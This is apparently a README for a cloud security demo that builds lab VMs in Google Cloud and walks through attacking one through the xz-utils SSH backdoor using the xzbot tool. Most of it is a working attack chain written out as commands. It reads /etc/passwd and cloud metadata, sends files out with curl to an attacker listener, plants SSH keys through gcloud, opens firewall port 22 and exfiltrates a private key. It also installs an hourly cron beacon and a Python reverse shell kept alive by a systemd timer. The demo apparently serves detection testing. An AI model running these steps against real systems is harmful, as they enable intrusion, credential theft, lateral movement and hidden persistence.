# xz-utils demo
This will create two vms within google cloud (admin-vm and developer-vm), both running on Ubuntu. The developer vm will get 
and updated liblzma that is vulnerable to the xz-utils vulnerability. On both hosts the Lacework agent will be installed.
Kudos to the xzbot team: https://github.com/amlweems/xzbot/tree/main

## Deploy the infrastructure to Google Cloud
### Access to Google Cloud
Open google cloud console https://console.cloud.google.com/

Enable cloud billing api https://console.cloud.google.com/marketplace/product/google/cloudbilling.googleapis.com

Activate cloud shell
```
gcloud auth application-default login
```

### Clone repository and adjust config
```
git clone https://github.com/modernciso/xzhack-demo
```

Insert correct billing account in main.tf
```
  data "google_billing_account" "acct" {
  display_name = "<Your Billing Account Name>"  
  }
```

Change to desired google project name and id (will be created by the terraform script)
```
resource "google_project" "my_project" {
  name            = "xz-hack"
  project_id      = "xz-hack-${random_id.bucket_prefix.hex}"
  billing_account = data.google_billing_account.acct.id
}
```

Create a new valid agent token in Lacework and copy the installer link
```
variable "lacework-agent" {
  type    = string
  default = "AGENTURL/install.sh"
}

```

### run terraform
```
terraform init
terraform apply
```

## Prepare Kali Linux
We will install a Nodejs Express Server on Kali linux that will server as a simple backchannel
```
git clone https://github.com/modernciso/xzhack-demo
sudo apt install npm nodejs
npm install --global yarn
cd /opt
sudo mkdir xzlistener
cd xzlistener
sudo npm install --global yarn
sudo npm install --global body-parser
npm init
sudo cp /home/kali/xzhack-demo/package.json /opt/xzlistener/package.json
sudo cp /home/kali/xzhack-demo/index.js /opt/xzlistener/index.js
go install github.com/amlweems/xzbot@latest
export PATH=$PATH:/home/kali/go/bin
```

## Attack
### Check for open ports from Kali Linux
We check if the firewall is blocking ssh for the admin-vm
```
nmap -Pn developer-vm-ip -p 22
nmap -Pn admin-vm-ip -p 22
```

The result for the admin-vm should state that it is "filtered"

### Check if xzbot is working
We test if the xzbot demo tool is working
```
xzbot -addr developer-vm-ip:22
```
This will trigger the exploit on the developer-vm on port 22. You will receive an output looking like this. If the last message is "ssh: handshake failed: EOF" then the exploit successfully runs. On the developer-vm a file is created in /tmp/.xz. If all of those preparations are done we can move on with the attack

```
00000170  00 00 01 01 00 00 01 00  34 12 00 00 78 56 00 00  |........4...xV..|
00000180  a2 ff d9 f9 ff ff ff ff  92 7b 6e 49 b3 4a b2 e1  |.........{nI.J..|
00000190  da cc 80 9f ef 32 33 c3  39 20 0e 94 cc bd 1b 4a  |.....23.9 .....J|
000001a0  dc 63 2b 29 8a 22 aa 3a  5f 73 d5 60 71 2f 3d 38  |.c+).".:_s.`q/=8|
000001b0  41 f2 f1 e8 34 d6 49 e1  b9 ca 63 56 49 18 4c 77  |A...4.I...cVI.Lw|
000001c0  b8 54 6f 83 c9 5a 28 9d  07 12 a3 a4 06 7d 7d 96  |.To..Z(......}}.|
000001d0  ac 9c 12 74 c9 90 b3 c7  ea 2c 79 4e 0c 32 31 13  |...t.....,yN.21.|
000001e0  c2 dc db c5 84 27 42 1d  11 51 0f 81 69 a0 6f 10  |.....'B..Q..i.o.|
000001f0  fb 79 8a 21 0d 61 86 59  81 1d bf 47 b9 5f a0 49  |.y.!.a.Y...G._.I|
00000200  8c 28 de ce 0a ff 6f 47  0c d2 34 a9 35 00 00 00  |.(....oG..4.5...|
00000210  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000220  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000230  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000240  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000250  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000260  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000270  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 07  |................|
00000280  73 73 68 2d 72 73 61 00  00 00 01 00              |ssh-rsa.....|
2024/04/17 11:47:15 ssh: handshake failed: EOF
```

### First reconnaissance attack
We only have limited characters for the attack (for every attempt everytime 64 characters), so we trigger xzbot multiple times, create a script on the developer-vm, execute the script and cleanup afterwards. To receive files curl is triggered to post the files to our backchannel. All output is base64 encoded and decoded on the kali linux side.

First we start out backchannel listener (best in a separate window)
```
cd /opt/xzlistener
yarn start &
```

Next we trigger the xzboit to build our script. Adjust the Backchannel-IP (KALILINUX-IP) to your real kali linux IP.
```
xzbot -addr developer-vm:22 -cmd "uname -a > /tmp/x.uname"
xzbot -addr developer-vm:22 -cmd "gcloud compute instances list |base64 >> /tmp/x.gcloud"
xzbot -addr developer-vm:22 -cmd "whoami |base64 >> /tmp/x.whoami"
xzbot -addr developer-vm:22 -cmd "cat /etc/passwd |base64 >> /tmp/x.passwd"
xzbot -addr developer-vm:22 -cmd 'echo "#!/bin/sh" > /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "curl \\" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "http://metadata.google.internal/\\" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "computeMetadata/v1/instance/service-accounts/\\" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "default/scopes \\" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo " -H Metadata-Flavor:Google" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'sh /tmp/x |base64 > /tmp/x.metadata'
xzbot -addr developer-vm:22 -cmd 'echo "curl -i -X POST http://KALILINUX-IP/exfil \\" >> /tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "-H \"Content-Type: text/plain\" \\" >>/tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "--data-binary \"@/tmp/x.uname\" " >>/tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "curl -i -X POST http://KALILINUX-IP/exfil \\" >> /tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "-H \"Content-Type: text/plain\" \\" >>/tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "--data-binary \"@/tmp/x.passwd\" " >>/tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "curl -i -X POST http://KALILINUX-IP/exfil \\" >> /tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "-H \"Content-Type: text/plain\" \\" >>/tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "--data-binary \"@/tmp/x.whoami\" " >>/tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "curl -i -X POST http://KALILINUX-IP/exfil \\" >> /tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "-H \"Content-Type: text/plain\" \\" >>/tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "--data-binary \"@/tmp/x.gcloud\" " >>/tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "curl -i -X POST http://KALILINUX-IP/exfil \\" >> /tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "-H \"Content-Type: text/plain\" \\" >>/tmp/ex'
xzbot -addr developer-vm:22 -cmd 'echo "--data-binary \"@/tmp/x.metadata\" " >>/tmp/ex'
xzbot -addr developer-vm:22 -cmd 'sh /tmp/ex'
xzbot -addr developer-vm:22 -cmd 'rm -f /tmp/ex'
xzbot -addr developer-vm:22 -cmd 'rm -f /tmp/x.*'
xzbot -addr developer-vm:22 -cmd 'rm -f /tmp/x'
```

This will take some time, but after around a minute we should receive all information via the backchannel. We should receive gcloud, /etc/passwd, hostname, whoami, uname and google metadata information. This is how the sample output can look like:
```
BASE64:  aHR0cHM6Ly93d3cuZ29vZ2xlYXBpcy5jb20vYXV0aC9jb21wdXRlCmh0dHBzOi8vd3d3Lmdvb2ds
ZWFwaXMuY29tL2F1dGgvZGV2c3RvcmFnZS5yZWFkX29ubHkKaHR0cHM6Ly93d3cuZ29vZ2xlYXBp
cy5jb20vYXV0aC9sb2dnaW5nLndyaXRlCmh0dHBzOi8vd3d3Lmdvb2dsZWFwaXMuY29tL2F1dGgv
bW9uaXRvcmluZy53cml0ZQpodHRwczovL3d3dy5nb29nbGVhcGlzLmNvbS9hdXRoL3B1YnN1Ygpo
dHRwczovL3d3dy5nb29nbGVhcGlzLmNvbS9hdXRoL3NlcnZpY2UubWFuYWdlbWVudC5yZWFkb25s
eQpodHRwczovL3d3dy5nb29nbGVhcGlzLmNvbS9hdXRoL3NlcnZpY2Vjb250cm9sCmh0dHBzOi8v
d3d3Lmdvb2dsZWFwaXMuY29tL2F1dGgvdHJhY2UuYXBwZW5kCg==

DATA:  https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
https://www.googleapis.com/auth/pubsub
https://www.googleapis.com/auth/service.management.readonly
https://www.googleapis.com/auth/servicecontrol
https://www.googleapis.com/auth/trace.append
```

### Next stage, get persistence and laterally move
In the next stage we will create a script that will generate new ssh keys for a new user and we will leverage gcloud to propagate those across the other systems. We will also modify the google firewall and open up port 22 on the admin-vm. To gain access to the admin-vm we will exfiltrate the private key via the backchannel. 
```
xzbot -addr developer-vm:22 -cmd 'echo "#!/bin/sh" > /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "ssh-keygen -t rsa -C \\" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "\"xzattacker\" -f /tmp/key -P \"\" " >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "cat /tmp/key | base64 > /tmp/x.key" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "NEWKEY=\"\$(cat /tmp/key.pub)\"" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "echo \"xzattacker:\$NEWKEY\" >> /tmp/meta.txt" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "gcloud -q compute instances add-metadata \\" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "admin-vm --metadata-from-file \\" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "ssh-keys=/tmp/meta.txt --zone us-west1-c" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "gcloud compute firewall-rules create \\" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "vm-fw-allow-new --allow=tcp:22 \\" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "--network vm-vpc" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "curl -i -X POST http://KALILINUX-IP/exfil \\" >> /tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "-H \"Content-Type: text/plain\" \\" >>/tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "--data-binary \"@/tmp/x.key\" " >>/tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "rm -f /tmp/x.key" >>/tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "rm -f /tmp/key" >>/tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "rm -f /tmp/key.pub" >>/tmp/x'
xzbot -addr developer-vm:22 -cmd 'echo "rm -f /tmp/meta.txt" >>/tmp/x'
xzbot -addr developer-vm:22 -cmd 'sh /tmp/x'
sleep 20
xzbot -addr developer-vm:22 -cmd 'rm -f /tmp/x'
```
After a short time we should receive the newly generated private key on our backchannel. The output will look like this (Copy & Paste the whole private key).
```
LEgAV9uABb3VPUWwDRHZAWrBnV28i4GSLBGf3RErvG0Xy8U6j1smQIn9ElSMudhbeFi50p
Hta6vMi2GPWGls1WEDlAC/ixLKgrLOihouWE9HXUwM8PH249MXGUr9mMiEV0S3XQzjNF81
QECax7ZeTvLRzexKa/xjmlXX7L4l0INb13NfkKBY5SO3nzOgAAAMEAwW97VmtCitNeSL2J
0mBj7DX8HMcXNZ8LATfsJv2gDI4feCgzvca2nv6wYUsqKVp5ECHIZoXsd6hylqhmZF0Azn
NOiBmdhSn3VPvZZozAl+ezzihVJBY1KoM+Lg9E1z6y5klQ/hTvHVwPknfYpvWdoC2xYJr9
HqbRgsbQdEjBONOCsAfbCjZzKlMZInUnYFXWrx8zTg/N3BD2kQDMt2OTl90BcAoiFPofg/
WznpetCzJj9LsA6CuieJ8uYywDKYBFAAAAwQC9J5qpDYXAr8/E83V+ZBHXdSP000RKI/TY
hypsUk66WxgigJh+a25ibC2ldOCv1iltGA+GC8NX+0pPM2SlF9hkO/N0nXDl073dAULJGZ
tR+GqSHCJMwr1sKuFYwB10RNU++ZphZBlfgVZKGQQ23Ju4qz5s5dsyNr3a25iQOBlMccx5
MUxZRczr+ueTS4n8InWpoRiUBNCqvudR5l5orDYY6mhK9ME9pDTdG2uklY0+VRArFjjnRd
XhfkVI3oJ4cYcAAAAKeHphdHRhY2tlcgE=
-----END OPENSSH PRIVATE KEY-----
```

## SSH into the admin-vm
grab private key from listener and copy to /home/kali/.ssh/keys/key. We should be able to ssh into the admin-vm and also change to the superuser
```
chmod 400 /home/kali/.ssh/keys/key
ssh -i .ssh/keys/key xzattacker@admin-vm-ip
whoami
sudo su
whoami
```

## SSH between admin-vm and developer-vm using gcloud
```
gcloud compute ssh developer-vm
gcloud compute ssh admin-vm
```

## Create heartbeat on both systems
On both machines (as user xzattacker) run `crontab -e`and add the following crontab entry. Replace the "KALILINUX-IP" with your IP. This will add an hourly scheduled heartbeet message to our backchannel with the hostname and timestamp. With that we can make sure that systems are up and running.
```
0 * * * * echo "$(hostname) $(date)"|base64 >/tmp/x.hostname && curl -i -X POST http:/KALILINUX-IP/exfil -H "Content-Type: text/plain" --data-binary "@/tmp/x.hostname" && rm -f /tmp/x.hostname
```

## Create listener on Kali Linux
For our fallback backdoor we will create a new listener on our Kali Linux (best in another new windows to have both listeners up and running)
```
nc -nlvp 4444
```

## Create fallback Backdoor Script on both systems 
In case our crontab entry is detected we assume that our backchannel triggered via curl might not work anymore. In this case we will use a second backdoor that is scheduled every 5 minutes as a systemd service
Create this backdoor script that opens up a simple connection back to our Kali linux on port 4444. Replace the KALILINUX-IP with your real IP.
For the demo let's create the backdoor in `/tmp/backdoor.sh` and make it executable with `chmod +x /tmp/backdoor.sh`.
```
#!/bin/bash
if crontab -u xzattacker -l | grep KALILINUX-IP; then sleep 5; else python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""KALILINUX-IP"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""sh"")'; fi
```

Now we create the new service for systemd in `/etc/systemd/system/xz.service`
```
[Unit]

Description=xz service

[Service]

User=xzattacker
ExecStart=/tmp/backdoor.sh
```

Now we create the timer for this service also in `/etc/systemd/system/xz.timer`. The timer will run every 5 minutes and trigger the backdoor.sh script. The script checks if the crontab entry is still there and if not runs a python backdoor connection.
```
[Unit]

Description=xz timer

[Timer]

OnBootSec=5

OnUnitActiveSec=5m

[Install]

WantedBy=timers.target
```

Once finished we need to reload systemd, enable the timer and start it. Then we check if the timer is running correctly.
```
sudo systemctl daemon-reload 
sudo systemctl enable xz.timer
sudo systemctl start xz.timer
systemctl list-timers
```

